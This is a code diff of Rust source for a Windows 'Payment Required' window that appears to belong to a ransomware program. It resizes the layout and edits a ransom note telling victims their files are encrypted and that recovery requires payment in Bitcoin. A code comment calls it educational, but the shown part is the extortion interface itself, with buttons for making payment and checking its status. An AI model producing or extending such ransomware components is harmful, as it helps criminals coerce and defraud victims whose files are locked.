@@ -13,24 +13,24 @@ use windows::Win32::UI::Shell::{SHGetKnownFolderPath, FOLDERID_Music, FOLDERID_D
 
 #[derive(Default, NwgUi)]
 pub struct PaymentWindow {
-    #[nwg_control(size: (620, 580), position: (300, 100), title: "Payment Required", flags: "WINDOW|VISIBLE")]
+    #[nwg_control(size: (620, 640), position: (300, 20), title: "Payment Required", flags: "WINDOW|VISIBLE")]
     #[nwg_events(OnWindowClose: [PaymentWindow::close])]
     window: nwg::Window,
 
     #[nwg_control(text: "ATTENTION: YOUR FILES HAVE BEEN ENCRYPTED", position: (20, 10), size: (600, 90), flags: "VISIBLE")]
     header: nwg::Label,
 
-    #[nwg_control(text: "", position: (20, 70), size: (600, 380), flags: "VISIBLE|VSCROLL|AUTOVSCROLL", readonly: true)]
+    #[nwg_control(text: "", position: (20, 70), size: (600, 440), flags: "VISIBLE|VSCROLL|AUTOVSCROLL", readonly: true)]
     instructions: nwg::TextBox,
 
-    #[nwg_control(text: "Make Payment", position: (100, 460), size: (200, 50))]
+    #[nwg_control(text: "Make Payment", position: (100, 520), size: (200, 50))]
     #[nwg_events(OnButtonClick: [PaymentWindow::make_payment])]
     payment_button: nwg::Button,
-    #[nwg_control(text: "Check Payment Status", position: (320, 460), size: (200, 50))]
+    #[nwg_control(text: "Check Payment Status", position: (320, 520), size: (200, 50))]
     #[nwg_events(OnButtonClick: [PaymentWindow::check_status])]
     status_button: nwg::Button,
 
-    #[nwg_control(text: "", position: (20, 520), size: (580, 50), flags: "VISIBLE", readonly: true)]
+    #[nwg_control(text: "", position: (20, 580), size: (580, 50), flags: "VISIBLE", readonly: true)]
     status_display: nwg::TextBox,
 
     pub_key: Rc<RefCell<Option<PublicKey>>>,
@@ -137,10 +137,11 @@ pub fn show_payment_window(public_key: Option<PublicKey>) {
     // Set the instructions text - looks authentic but is educational
     let instructions_text = 
         "What happened to your files?\r\n\r\n\
-        All your important files have been encrypted with military-grade encryption. Oops.\r\n\
+        All your important files have been encrypted with military-grade encryption.\r\n\
+        Oops ¯\\_(ツ)_/¯\r\n\
         Documents, photos, videos, databases and other files are no longer accessible.\r\n\r\n\
         Can I recover my files?\r\n\
-        Yes. We guarantee that you can recover all your files safely.\r\n\
+        Yes (˶ᵔ ᵕ ᵔ˶)! We guarantee that you can recover all your files safely.\r\n\
         But you need to pay for the decryption tool.\r\n\r\n\
         How do I pay?\r\n\
         Payment is accepted in Bitcoin only.\r\n\
